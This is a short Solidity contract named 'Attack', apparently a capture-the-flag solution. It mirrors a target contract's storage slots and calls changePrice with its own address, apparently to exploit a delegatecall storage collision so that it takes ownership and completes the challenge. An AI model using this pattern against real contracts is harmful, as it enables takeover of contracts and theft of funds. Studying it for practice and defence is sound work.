// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;
import "./1.sol";
contract Attack{
    address public solt0;//0
    address public owner;//1
    uint256 public prize;//2
    uint256 public score;//3
    check public check1;
    constructor(address addr) public {
        check1 = check(addr);//4
    }
    function setPrize(uint256 amount) public {
        owner = msg.sender;//
        prize = 0;
        
    }
    function attack() public {
        check1.changePrice(uint160(address(this)));
        check1.isCompleted();
    }
}